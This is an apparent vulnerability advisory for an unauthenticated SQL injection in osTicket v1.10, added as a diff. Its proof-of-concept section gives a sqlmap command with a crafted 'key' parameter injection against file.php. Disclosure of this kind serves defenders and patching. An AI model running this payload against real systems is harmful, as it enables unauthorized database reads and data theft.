@@ -1,0 +1,42 @@
+1. ADVISORY INFORMATION
+========================================
+Title: osTicket v1.10 Unauthenticated SQL Injection
+Application: osTicket
+Bugs:  SQL Injection
+Class: Sensitive Information disclosure
+Remotely Exploitable: Yes
+Authentication Required: NO
+Versions Affected: <= v1.10
+Technology: PHP
+Vendor URL: http://osticket.com/
+CVSSv3 Score: 10.0 (/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
+Date of found: 12 Sep 2017
+Author: Mehmet Ince
+Advisory:
+https://pentest.blog/advisory-osticket-v1-10-unauthenticated-sql-injection/
+
+2. CREDIT
+========================================
+This vulnerability was identified during penetration test
+by Mehmet INCE from PRODAFT / INVICTUS
+
+3. VERSIONS AFFECTED
+========================================
+osTicket < 1.10
+
+5. Technical Details & POC
+========================================
+Please visit an advisory URL for technical details.
+
+PoC code:
+python sqlmap.py -u "
+http://target/file.php?key[id%60%3D1*%23]=1&signature=1&expires=15104725311" --dbms MySQL
+
+6. RISK
+========================================
+The vulnerability allows remote attackers to execute a sql query on
+database system.
+
+7. REFERENCES
+========================================
+https://pentest.blog/advisory-osticket-v1-10-unauthenticated-sql-injection/
